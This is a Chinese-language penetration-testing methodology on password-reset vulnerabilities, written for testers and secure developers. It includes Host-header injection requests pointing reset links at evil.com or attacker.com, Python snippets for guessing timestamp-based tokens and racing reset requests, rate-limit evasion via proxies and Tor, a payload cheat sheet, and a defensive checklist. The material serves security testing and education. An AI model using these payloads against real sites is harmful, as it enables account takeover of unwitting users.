# **密码重置攻击方法论**

---

# **第一部分：文档概述**

## 1.1 编写目的
- 为测试人员提供系统化的密码重置功能测试方法
- 帮助识别密码重置流程中的逻辑缺陷和安全漏洞
- 提高密码重置相关漏洞的发现和利用效率

## 1.2 适用范围
- 适用于所有提供密码重置/恢复功能的 Web 应用、移动应用、API 服务
- 包括邮箱重置、短信重置、安全问题重置、人工客服重置等方式
- 常见于用户账户系统、企业应用、电商平台、社交网络

## 1.3 读者对象
- 渗透测试工程师、安全分析师
- 负责密码重置功能开发的安全开发人员
- 账户安全和身份验证相关人员

---

# **第二部分：核心渗透技术专题**

## 专题：密码重置攻击

## 2.1 技术介绍
- **漏洞原理：** 密码重置攻击是指利用密码重置流程中的设计缺陷或实现错误，绕过正常验证机制，重置目标用户的密码并获得账户控制权。
- **本质：** 密码重置流程的身份验证机制存在缺陷，未能充分验证请求者的真实身份，或重置 Token 的生成、验证、传输过程存在安全问题。

| **攻击类型** | **描述** | **常见原因** |
| :--- | :--- | :--- |
| **Token 预测攻击** | 预测密码重置 Token | Token 生成算法可预测 |
| **Token 重放攻击** | 重用已使用/过期的 Token | Token 一次性机制缺失 |
| **邮箱枚举攻击** | 通过重置功能枚举用户邮箱 | 错误信息泄露 |
| **Host 头注入** | 通过 Host 头控制重置链接 | 未验证 Host 头 |
| **参数污染攻击** | 篡改重置请求参数 | 参数验证不严 |
| **竞争条件攻击** | 利用并发请求绕过限制 | 无并发控制 |

## 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **忘记密码** | 通过邮箱/短信重置密码 | 重置 Token 生成/验证缺陷 |
| **账户恢复** | 通过安全问题恢复账户 | 安全问题答案可猜测 |
| **客服重置** | 通过工单/电话重置密码 | 身份验证流程薄弱 |
| **管理员重置** | 管理员为用户重置密码 | 权限验证不足 |
| **批量重置** | 企业批量密码重置 | 批量操作验证缺失 |
| **API 重置** | 通过 API 接口重置密码 | API 认证/授权缺陷 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

- **重置流程分析**
  - 完整走一遍密码重置流程
  - 记录所有请求参数、响应内容
  - 分析重置 Token 的格式、长度、编码
  - 识别 Token 的有效期和使用限制

- **Token 可预测性测试**
  ```
  # 收集多个 Token 样本
  请求 1: token=abc123...
  请求 2: token=abc456...
  请求 3: token=abc789...
  
  # 分析模式
  - 是否基于时间戳？
  - 是否基于用户 ID？
  - 是否递增/递减？
  - 是否有固定前缀/后缀？
  ```

- **Host 头注入测试**
  ```
  # 在密码重置请求中修改 Host 头
  POST /reset-password HTTP/1.1
  Host: attacker.com
  Content-Type: application/x-www-form-urlencoded
  
  email=victim@example.com
  
  # 检查重置链接是否指向 attacker.com
  ```

- **参数篡改测试**
  ```
  # 修改邮箱参数
  email=victim@example.com&email=attacker@example.com
  
  # 修改用户 ID 参数
  user_id=123 → user_id=124
  
  # 修改 Token 参数
  token=abc123 → token=abc124
  ```

### 2.3.2 白盒测试

- **代码审计要点**
  - 检查重置 Token 生成算法（随机性、熵值）
  - 查看 Token 验证逻辑（一次性、有效期）
  - 检查重置链接生成方式（Host 头使用）
  - 审查并发请求控制机制

- **关键代码模式**
  ```python
  # 危险模式：可预测的 Token 生成
  token = md5(user_id + timestamp)
  
  # 危险模式：未验证 Host
  reset_link = f"http://{request.host}/reset?token={token}"
  
  # 危险模式：Token 可重复使用
  if token == stored_token:  # 未标记为已使用
      reset_password()
  ```

## 2.4 漏洞利用方法

### 2.4.1 Token 预测攻击

- **时间戳依赖分析**
  ```python
  # 如果 Token 基于时间戳
  import time
  import hashlib
  
  current_time = int(time.time())
  for offset in range(-10, 10):
      guess = hashlib.md5(str(current_time + offset).encode()).hexdigest()
      try_reset(guess)
  ```

- **用户 ID 依赖分析**
  ```python
  # 如果 Token 基于用户 ID
  for user_id in range(1, 1000):
      token = generate_token(user_id)  # 推测生成算法
      try_reset(user_id, token)
  ```

- **序列模式分析**
  - 收集多个 Token 样本
  - 使用统计学工具分析模式
  - 利用机器学习预测下一个 Token

### 2.4.2 Host 头注入攻击

- **基本 Host 头注入**
  ```http
  POST /forgot-password HTTP/1.1
  Host: evil.com
  X-Forwarded-Host: evil.com
  
  email=victim@target.com
  ```

- **多 Host 头组合**
  ```http
  POST /forgot-password HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com
  X-Original-URL: evil.com
  Referer: https://evil.com/
  ```

- **攻击效果**
  - 受害者收到指向恶意站点的重置链接
  - 攻击者截获重置 Token
  - 攻击者使用 Token 重置受害者密码

### 2.4.3 Token 重放攻击

- **重放场景**
  - Token 使用后未失效
  - Token 过期后仍可用
  - 多个 Token 同时有效

- **攻击方法**
  1. 请求密码重置获取 Token
  2. 拦截重置邮件/短信
  3. 使用 Token 重置密码
  4. 再次使用同一 Token（如果未失效）

### 2.4.4 邮箱枚举攻击

- **基于错误信息的枚举**
  ```
  # 请求 1: 邮箱不存在
  POST /reset-password
  email=nonexistent@example.com
  响应：{"error": "邮箱未注册"}
  
  # 请求 2: 邮箱存在
  POST /reset-password
  email=valid@example.com
  响应：{"message": "重置邮件已发送"}
  ```

- **基于响应时间的枚举**
  - 邮箱存在：发送邮件事务，响应较慢
  - 邮箱不存在：直接返回错误，响应较快

### 2.4.5 竞争条件攻击

- **并发请求绕过**
  ```python
  # 同时发送多个重置请求
  import threading
  
  def request_reset():
      requests.post(url, data={'email': 'victim@example.com'})
  
  threads = []
  for i in range(10):
      t = threading.Thread(target=request_reset)
      threads.append(t)
      t.start()
  ```

- **利用场景**
  - 绕过速率限制
  - 生成多个有效 Token
  - 在 Token 被标记为使用前并发使用

### 2.4.6 安全问题攻击

- **常见弱安全问题**
  - 你的生日？
  - 你母亲的姓名？
  - 你最喜欢的颜色？
  - 你的宠物名字？

- **攻击方法**
  - 通过社交媒体收集答案
  - 使用字典攻击常见问题答案
  - 利用公开信息推测答案

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过速率限制

- **IP 轮换**
  - 使用代理池轮换源 IP
  - 利用云函数动态出口 IP
  - 使用 Tor 网络

- **参数变异**
  - 添加随机参数：`_rand=随机值`
  - 修改 User-Agent
  - 使用不同的邮箱大小写：`User@Example.com`

### 2.5.2 绕过 Token 过期检查

- **时间回拨攻击**
  - 在某些客户端验证场景，修改系统时间
  - 利用服务器时间同步问题

- **Token 刷新滥用**
  - 在 Token 即将过期时请求新 Token
  - 利用 Token 刷新机制保持有效性

### 2.5.3 绕过邮箱验证

- **邮箱别名利用**
  - `user+attack@gmail.com` 等同于 `user@gmail.com`
  - 利用邮箱服务商的别名规则

- **IDN 同形异义字**
  - 使用 Unicode 字符伪造相似邮箱
  - `exаmple.com`（西里尔字母 а）vs `example.com`

---

# **第三部分：附录**

## 3.1 常用 Payload 速查表

| **类别** | **Payload 示例** | **说明** |
| :--- | :--- | :--- |
| **Host 注入** | `Host: attacker.com` | 控制重置链接域名 |
| **Host 注入** | `X-Forwarded-Host: evil.com` | 备用 Host 头注入 |
| **参数篡改** | `email=victim.com&email=attacker.com` | 参数污染攻击 |
| **参数篡改** | `user_id=123&user_id=456` | 多值参数攻击 |
| **Token 预测** | 基于时间戳 MD5 | 时间依赖 Token |
| **Token 预测** | 基于用户 ID 哈希 | ID 依赖 Token |
| **邮箱枚举** | `user+1@gmail.com` ~ `user+100@gmail.com` | 邮箱别名测试 |

## 3.2 密码重置安全检查清单

| **检查项** | **安全要求** | **测试方法** |
| :--- | :--- | :--- |
| **Token 随机性** | 使用 CSPRNG 生成，至少 128 位熵 | 分析多个 Token 样本 |
| **Token 有效期** | 设置短有效期（<1 小时） | 延迟使用 Token 测试 |
| **一次性使用** | Token 使用后立即失效 | 尝试重用 Token |
| **Host 验证** | 白名单验证重置链接域名 | 尝试 Host 头注入 |
| **信息泄露** | 统一成功/失败响应 | 尝试邮箱枚举 |
| **速率限制** | 限制每用户/IP 重置频率 | 尝试暴力请求 |
| **并发控制** | 防止并发重置请求 | 尝试竞争条件 |
| **通知机制** | 密码重置后通知用户 | 检查通知功能 |

## 3.3 参考资源

- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [PortSwigger Password Reset Vulnerabilities](https://portswigger.net/web-security/authentication/passwords)
- [Account Takeover via Password Reset](https://www.invicti.com/blog/web-security/account-takeover-via-password-reset-host-header-injection/)
- [Password Reset Token Prediction](https://cwe.mitre.org/data/definitions/640.html)
